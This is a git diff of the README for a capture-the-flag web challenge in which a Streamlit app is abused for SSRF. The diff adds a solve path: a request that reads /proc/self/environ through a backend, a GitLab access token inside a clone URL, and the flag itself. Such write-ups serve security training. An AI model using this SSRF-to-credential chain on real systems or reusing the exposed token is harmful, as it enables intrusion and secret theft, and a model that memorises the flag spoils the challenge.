@@ -1,33 +1,38 @@
 # Stream Is Lit Isnt It
 
-> TODO
+> Unthread my plot, Chain your bugz, and Remember to Have Fun! ^_^
 
 - Medium / Web / Linux
 - Sources are given
     - Remove the `Detail` from the readme
-    - Censor the `flag_random_path` in `docker-compose.yml`
+    - Censor the `GIT_API_KEY` and `GIT_REPO_URL` in `docker-compose.yml`
 ---
 
 ```bash
-# Setup or Change Flag
-sed -E 's#.*./flag:/flag/.*#      - ./flag:/flag/flag_random_path_plifplafplouf:ro#g' docker-compose.yml
+# Debug Time
+cd /opt/sthack-2024-challs/stream-is-lit-isnt-it ; docker-compose down --remove-orphans --volumes ; docker-compose up --build --remove-orphans
+
+# Solve
+# Open http://127.0.0.1/
+# Submit http://backend_2:5000/?dump_me=/proc/self/environ
+# Use token & git clone https://gitlab.com:glpat-4dQKhn3be6YmzmfzJbyx@gitlab.com/TheLaluka/totaly_safe_and_private_repo.git
+# git diff 5eb01b7
+# Flag: chain-your-bugz-tozemoonandback-ffs
 
 # Setup & Recheck
-cd /opt/sthack-2024-challs/stream-is-lit-isnt-it ; docker compose run --rm -it --volume "$PWD:/host" -w /host --entrypoint /bin/bash mlflow -x exploit.sh ; docker compose down --remove-orphans --volumes ; docker compose up --build --remove-orphans -d
+cd /opt/sthack-2024-challs/stream-is-lit-isnt-it ; docker-compose run --rm -it --volume "$PWD:/host" -w /host --entrypoint /bin/bash mlflow -x exploit.sh ; docker-compose down --remove-orphans --volumes ; docker-compose up --build --remove-orphans -d
 
 # Logs
-docker compose logs -f
+docker-compose logs -f
 
 # Light-Long Auto-Fix
-echo '*/30 * * * * root bash -c "cd /opt/sthack-2024-challs/stream-is-lit-isnt-it ; docker compose run --rm -it --volume /opt/sthack-2024-challs/stream-is-lit-isnt-it:/host -w /host --entrypoint /bin/bash mlflow -x exploit.sh ; docker compose down --remove-orphans --volumes ; docker compose up --build --remove-orphans -d"' | sudo tee -a /etc/crontab
-
-# Doc / Source
-# TODO
+echo '*/30 * * * * root bash -c "cd /opt/sthack-2024-challs/stream-is-lit-isnt-it ; docker-compose run --rm -it --volume /opt/sthack-2024-challs/stream-is-lit-isnt-it:/host -w /host --entrypoint /bin/bash mlflow -x exploit.sh ; docker-compose down --remove-orphans --volumes ; docker-compose up --build --remove-orphans -d"' | sudo tee -a /etc/crontab
 ```
 
 # Detail
 
 - Abust StreamLit for SSRF
 - Abuse SSRF for Local File Read
-- Read /proc/1/environ to get api_key
-- Reuse api_key to cat flag
+- Read /proc/self/environ to get git api_key
+- Reuse api_key to clone git repo
+- Dig past commits to find the flag
